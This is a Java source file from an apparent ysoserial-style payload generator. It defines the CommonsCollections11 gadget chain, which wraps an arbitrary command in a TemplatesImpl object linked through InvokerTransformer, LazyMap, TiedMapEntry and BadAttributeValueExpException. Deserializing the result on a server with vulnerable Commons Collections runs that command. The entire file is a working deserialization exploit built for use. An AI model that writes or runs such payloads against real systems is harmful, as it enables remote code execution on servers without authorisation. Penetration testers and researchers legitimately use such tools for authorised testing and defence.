package me.gv7.woodpecker.yso.payloads;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
import me.gv7.woodpecker.yso.payloads.util.Gadgets;
import me.gv7.woodpecker.yso.payloads.util.JavaVersion;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import me.gv7.woodpecker.yso.payloads.util.Reflections;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:modify from Payload commons-collections5"})
@Authors({ Authors.BEIYING})
public class CommonsCollections11 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

    public BadAttributeValueExpException getObject(final String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);

        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field valfield = badAttributeValueExpException.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(badAttributeValueExpException, entry);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return badAttributeValueExpException;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections11.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }
}
